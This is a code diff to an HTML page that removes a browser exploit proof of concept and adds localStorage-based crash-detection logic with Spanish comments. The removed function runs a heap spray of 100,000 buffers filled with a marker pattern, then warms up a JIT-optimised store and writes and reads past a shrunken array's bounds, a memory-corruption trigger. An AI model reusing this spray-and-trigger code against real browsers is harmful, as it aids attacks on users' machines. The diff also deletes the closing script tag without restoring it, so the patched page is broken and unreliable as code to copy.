@@ -153,64 +153,33 @@ body {
 </div>
 <script>
 window.onload = () => {
-  const startTime = parseInt(localStorage.getItem("crashStartTime") || "0");
-  const pending = localStorage.getItem("crashPending");
-  const now = Date.now();
-  const elapsed = now - startTime;
+  const lastSuccess = parseInt(localStorage.getItem("lastSuccessfulUse") || "0");
+  const crashStart = parseInt(localStorage.getItem("crashStartTime") || "0");
+  const pending = localStorage.getItem("crashPending") === "yes";
 
-  if (pending === "yes" && elapsed > 5000) {
+  const now = Date.now();
+  const elapsedSinceCrash = now - crashStart;
+
+  if (pending && crashStart && (now - lastSuccess > 6000)) {
+    // Se considera un crash porque ha pasado demasiado tiempo sin uso válido
     let count = parseInt(localStorage.getItem("crashCount") || "0");
     count++;
     localStorage.setItem("crashCount", count.toString());
 
     alert(
       `⚠️ Last run may have triggered instability or crash.\n` +
-      `⏱ Elapsed: ${Math.floor(elapsed / 1000)}s\n` +
+      `⏱ Elapsed: ${Math.floor(elapsedSinceCrash / 1000)}s\n` +
       `💥 Total crashes detected: ${count}`
     );
+
+    localStorage.removeItem("crashPending");
+    localStorage.removeItem("crashStartTime");
   }
 
-  localStorage.removeItem("crashPending");
-  localStorage.removeItem("crashStartTime");
+  // Actualizamos el último uso normal del navegador
+  localStorage.setItem("lastSuccessfulUse", now.toString());
 };
 
-function runPoC() {
-  document.getElementById("message").textContent =
-    "Fullscreen activated...\nSpraying memory...";
-
-  localStorage.setItem("crashPending", "yes");
-  localStorage.setItem("crashStartTime", Date.now().toString());
-
-  setTimeout(() => {
-    document.body.requestFullscreen().then(() => {
-      const PATTERN = 0x43434343;
-      const SPRAY_CNT = 100000;
-      const SPRAY_LEN = 16;
-
-      const spray = [];
-      for (let i = 0; i < SPRAY_CNT; i++) {
-        const buf = new ArrayBuffer(SPRAY_LEN * 4);
-        const u32 = new Uint32Array(buf);
-        for (let j = 0; j < u32.length; j++) u32[j] = PATTERN;
-        spray.push({ u32, f64: new Float64Array(buf) });
-      }
-
-      let victim = [1.1, 2.2, 3.3, 4.4];
-      function opt(arr, idx, val) { arr[idx] = val; }
-
-      for (let i = 0; i < 10000; i++) opt(victim, 1, 5.5);
-      victim.length = 1;
-      const TRIGGER_IDX = 3;
-      opt(victim, TRIGGER_IDX, 13.37);
-      let read = victim[TRIGGER_IDX];
-
-      document.getElementById("popup").style.display = "block";
-    }).catch(err => {
-      document.getElementById("message").textContent = "Error: " + err.message;
-    });
-  }, 500);
-}
-</script>
 
 
 
